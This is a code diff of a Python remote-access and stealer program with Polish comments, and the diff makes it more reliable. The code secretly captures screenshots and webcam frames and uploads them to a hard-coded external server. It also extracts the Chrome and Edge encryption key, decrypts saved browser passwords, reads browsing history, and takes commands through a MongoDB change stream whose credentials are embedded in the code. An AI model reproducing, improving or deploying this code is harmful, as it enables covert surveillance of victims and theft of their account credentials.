@@ -24,20 +24,19 @@ import base64
 from pynput.keyboard import Controller
 import hashlib
 import uuid
+import time
 
-# 🎯 KONFIGURACJA
-API_URL = "https://money-cat-bot.onrender.com"  # Zmienna do wskazania lokalizacji serwera Express
+API_URL = "https://money-cat-bot.onrender.com"
 COMPUTER_NAME = socket.gethostname()
 
 def get_id():
-    # Można użyć MAC adresu, który jest unikalny dla każdego urządzenia
     mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
     return hashlib.sha256(mac.encode()).hexdigest()[:20]
 
 COMPUTER_ID = get_id()
 
-CAMERA_INDEX = 0  # Jeśli masz kilka kamerek, możesz zmienić
-DELAY = 60  # Czas między wysyłaniem
+CAMERA_INDEX = 0
+DELAY = 60
 
 ACTIVITY_ROLE_ID=1345172216731664424
 
@@ -49,11 +48,11 @@ pyautogui.FAILSAFE = False
 cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
 
 client = MongoClient("mongodb+srv://money:WRyAg58QYq5L1S43@moneybot.0zo57.mongodb.net/?retryWrites=true&w=majority&appName=MoneyBot")  # Zmienna URL powinna być poprawna
-db = client['test']  # Zamień na nazwę swojej bazy danych
-collection = db['requests']  # Zamień na nazwę swojej kolekcji
+db = client['test']
+collection = db['requests']
 
 def watch_changes():
-    change_stream = collection.watch()  # Otwiera strumień zmian
+    change_stream = collection.watch()
     print("😎 Started watching for changes!")
     for change in change_stream:
         data = change.get("fullDocument", {})
@@ -219,46 +218,75 @@ listener.start()
 
 async def send_screenshot():
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
-    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
+    local_path = os.path.join(documents_path, "local")
 
-    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
+    os.makedirs(local_path, exist_ok=True)
 
     while True:
         await asyncio.sleep(DELAY)
 
         screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
+        
+        try:
+            pyautogui.screenshot().save(screenshot_path)
+        except Exception as e:
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error taking auto screenshot", Color="#ff0000", code_block=True)
+            continue
+
+        try:
+            with open(screenshot_path, 'rb') as f:
+                files = {'screenshot': f}
+                requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_ID": COMPUTER_ID})
+        except requests.exceptions.RequestException as e:
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending auto screenshot", Color="#ff0000", code_block=True)
+            continue
+
+        for attempt in range(5):
+            try:
+                os.remove(screenshot_path)
+                break
+            except PermissionError as e:
+                if attempt == 4:
+                    send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting auto screenshot", Color="#ff0000", code_block=True)
+                time.sleep(1)
+
+def send_screenshot_now():
+    try:
+        documents_path = os.path.join(os.path.expanduser("~"), "Documents")
+        local_path = os.path.join(documents_path, "local")
+
+        os.makedirs(local_path, exist_ok=True)
+
+        screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
         pyautogui.screenshot().save(screenshot_path)
 
         with open(screenshot_path, 'rb') as f:
-            files = {'screenshot': f}
-            try:
-                requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_ID": COMPUTER_ID})
-            except requests.exceptions.RequestException as e:
-                print(e)
-        
-        os.remove(screenshot_path)
+            screenshot_data = f.read()
 
-def send_screenshot_now():
-    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
-    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
-
-    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
-
-    screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
-    pyautogui.screenshot().save(screenshot_path)
-
-    with open(screenshot_path, 'rb') as f:
-        files = {'screenshot': f}
+        files = {'screenshot': screenshot_data}
         data = {
             "message": f"**{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}**",
             "COMPUTER_ID": COMPUTER_ID
         }
-        
+
         try:
-            requests.post(f"{API_URL}/upload-screenshot", files=files, data=data)
+            response = requests.post(f"{API_URL}/upload-screenshot", files=files, data=data)
+            response.raise_for_status()
         except requests.exceptions.RequestException as e:
-            print(e)
-    os.remove(screenshot_path)
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending screenshot", Color="#ff0000", code_block=True)
+            return
+
+        for attempt in range(5):
+            try:
+                shutil.rmtree(screenshot_path) if os.path.isdir(screenshot_path) else os.remove(screenshot_path)
+                break
+            except PermissionError:
+                time.sleep(1)
+        else:
+            send_to_express("`❌` Error deleting screenshot file!", COMPUTER_ID)
+
+    except Exception as e:
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Unexpected Screenshot Error", Color="#ff0000", code_block=True)
 
 def send_info_now():
     external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
@@ -364,74 +392,96 @@ def start_bot(external_ip, private_ip, id):
         print(e)
         
 async def send_camera_frame():
-    if not cap.isOpened():
-        print("❌ Can not get image from camera!")
-        send_to_express("`❌` Can not get image from camera!", COMPUTER_ID)
-        return
+    global cap
     
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
     local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
-
-    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
+    os.makedirs(local_path, exist_ok=True)
 
     while True:
-        await asyncio.sleep(DELAY)
-
+        if not cap.isOpened():
+            send_to_express("`❌` Can not get image from camera! `🔄` Restarting camera cap...", COMPUTER_ID)
+            cap.release()
+            await asyncio.sleep(1)
+            cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
+        
         ret, frame = cap.read()
         if not ret:
-            print("❌ Error connecting to camera frame!")
-            send_to_express("`❌` Error connecting to camera frame!", COMPUTER_ID)
-            break
+            send_to_express("`❌` Error connecting to camera frame! Retrying...", COMPUTER_ID)
+            await asyncio.sleep(1)
+            continue
 
         frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
-        cv2.imwrite(frame_path, frame)  # Zapisujemy klatkę
 
-        with open(frame_path, 'rb') as f:
-            files = {'frame': f}
+        try:
+            cv2.imwrite(frame_path, frame)  # Zapis klatki
+        except Exception as e:
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error saving camera frame", Color="#ff0000", code_block=True)
+            continue
+
+        try:
+            with open(frame_path, 'rb') as f:
+                response = requests.post(f"{API_URL}/upload-camera", files={'frame': f}, data={"COMPUTER_ID": COMPUTER_ID})
+                if response.status_code != 200:
+                    send_to_express(f"`❌` Failed to upload frame: `{response.status_code}`", COMPUTER_ID)
+        except Exception as e:
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending camera frame", Color="#ff0000", code_block=True)
+            continue  # Nie usuwamy pliku, jeśli nie został wysłany
+
+        for attempt in range(5):
             try:
-                response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_ID": COMPUTER_ID})
-                if response.status_code == 200:
-                    print(f"✔️ Frame uploaded successfully: {frame_path}")
-                else:
-                    print(f"❌ Failed to upload frame: {response.status_code}")
-            except Exception as e:
-                print(f"❌ Error while sending frame: {e}")
-        
-        os.remove(frame_path)  # Usuwamy plik po wysłaniu
+                os.remove(frame_path)
+                break
+            except PermissionError as e:
+                if attempt == 4:
+                    send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting frame", Color="#ff0000", code_block=True)
+                time.sleep(1)
+        await asyncio.sleep(DELAY)
+
     cap.release()
 
 def send_camera_frame_now():
+    global cap
 
     if not cap.isOpened():
-        print("❌ Can not get image from camera!")
-        send_to_express("`❌` Can not get image from camera!", COMPUTER_ID)
-        return
-    
-    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
-    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
+        send_to_express("`❌` Can not get image from camera! `🔄` Restarting camera cap...", COMPUTER_ID)
+        cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
 
-    os.makedirs(local_path, exist_ok=True)  # Tworzy folder, jeśli nie istnieje
-    
+    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
+    local_path = os.path.join(documents_path, "local")
+    os.makedirs(local_path, exist_ok=True)
+
     ret, frame = cap.read()
     if not ret:
-        print("❌ Error connecting to camera frame!")
         send_to_express("`❌` Error connecting to camera frame!", COMPUTER_ID)
         return
 
     frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
-    cv2.imwrite(frame_path, frame)  # Zapisujemy klatkę
 
-    with open(frame_path, 'rb') as f:
-        files = {'frame': f}
+    try:
+        cv2.imwrite(frame_path, frame)  # Zapis klatki
+    except Exception as e:
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error saving camera frame", Color="#ff0000", code_block=True)
+        return
+
+    try:
+        with open(frame_path, 'rb') as f:
+            response = requests.post(f"{API_URL}/upload-camera", files={'frame': f}, data={"COMPUTER_ID": COMPUTER_ID})
+            if response.status_code != 200:
+                send_to_express(f"`❌` Failed to upload frame: `{response.status_code}`", COMPUTER_ID)
+    except Exception as e:
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending camera frame", Color="#ff0000", code_block=True)
+        return  # Nie usuwamy pliku, jeśli nie został wysłany
+
+    for attempt in range(5):
         try:
-            response = requests.post(f"{API_URL}/upload-camera", files=files, data={"COMPUTER_ID": COMPUTER_ID})
-            if response.status_code == 200:
-                print(f"✔️ Frame uploaded successfully: {frame_path}")
-            else:
-                print(f"❌ Failed to upload frame: {response.status_code}")
-        except Exception as e:
-            print(f"❌ Error while sending frame: {e}")
-    os.remove(frame_path)  # Usuwamy plik po wysłaniu
+            os.remove(frame_path)
+            break
+        except PermissionError as e:
+            if attempt == 4:
+                send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting frame", Color="#ff0000", code_block=True)
+            time.sleep(1)  
+
     cap.release()
 
 async def start():
@@ -474,12 +524,11 @@ def get_full_app_name(app_name_part):
             full_app_names.append(window)  # Dodajemy pełną nazwę aplikacji do listy
     return full_app_names
 
-# Funkcja do pobierania historii przeglądarek (Edge/Chrome)
 def get_browser_history(browser="chrome", limit=10):
     try:
         if browser == "edge":
             history_db = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
-        else:  # Domyślnie Chrome
+        else:
             history_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
 
         if not os.path.exists(history_db):
@@ -494,7 +543,7 @@ def get_browser_history(browser="chrome", limit=10):
         try:
             cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
         except sqlite3.DatabaseError as e:
-            raise RuntimeError(f"❌ SQLite error while fetching history: {e}")
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="SQLite error while fetching history", Color="#ff0000", code_block=True)
 
         raw_history = cursor.fetchall()
         conn.close()
@@ -504,15 +553,14 @@ def get_browser_history(browser="chrome", limit=10):
         return history_list
 
     except Exception as e:
-        print(f"❌ Error in get_browser_history: {e}")
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error inget_browser_history", Color="#ff0000", code_block=True)
         return []
 
-# Funkcja do pobierania klucza szyfrującego dla przeglądarki (Edge/Chrome)
 def get_encryption_key(browser="chrome"):
     try:
         if browser == "edge":
             local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State")
-        else:  # Domyślnie Chrome
+        else:
             local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
         
         if not os.path.exists(local_state_path):
@@ -525,11 +573,9 @@ def get_encryption_key(browser="chrome"):
         return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
     except Exception as e:
-        print(f"❌ Error in get_encryption_key: {e}")
-        send_to_express(f"`❌` Error in get_encryption_key: \n ```{e}```", COMPUTER_ID)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_encryption_key", Color="#ff0000", code_block=True)
         return None
 
-# Funkcja do odszyfrowania hasła
 def decrypt_password(encrypted_password, key):
     try:
         iv = encrypted_password[3:15]
@@ -537,16 +583,14 @@ def decrypt_password(encrypted_password, key):
         cipher = AES.new(key, AES.MODE_GCM, iv)
         return cipher.decrypt(encrypted_password)[:-16].decode()
     except Exception as e:
-        print(f"❌ Error decrypting password: {e}")
-        send_to_express(f"`❌` Error decrypting password: \n ```{e}```", COMPUTER_ID)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error decrypting passwor", Color="#ff0000", code_block=True)
         return ""
 
-# Funkcja do pobierania zapisanych haseł (Edge/Chrome)
 def get_browser_passwords(browser="chrome"):
     try:
         if browser == "edge":
             db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data")
-        else:  # Domyślnie Chrome
+        else:
             db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
 
         if not os.path.exists(db_path):
@@ -561,7 +605,7 @@ def get_browser_passwords(browser="chrome"):
         try:
             cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
         except sqlite3.DatabaseError as e:
-            raise RuntimeError(f"❌ SQLite error: {e}")
+            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="SQLite error", Color="#ff0000", code_block=True)
 
         key = get_encryption_key(browser)
 
@@ -570,7 +614,8 @@ def get_browser_passwords(browser="chrome"):
             try:
                 decrypted_password = decrypt_password(password, key)
             except Exception as e:
-                decrypted_password = f"❌ Decryption failed: {e}"
+                send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Decryption failed", Color="#ff0000", code_block=True)
+                decrypted_password = "❌"
 
             passwords.append({
                 "url": url,
@@ -584,8 +629,7 @@ def get_browser_passwords(browser="chrome"):
         return passwords
 
     except Exception as e:
-        print(f"❌ Error in get_browser_passwords: {e}")
-        send_to_express(f"`❌` Error in get_browser_passwords: \n ```{e}```", COMPUTER_ID)
+        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_browser_passwords", Color="#ff0000", code_block=True)
         return []
 
 if __name__ == "__main__":
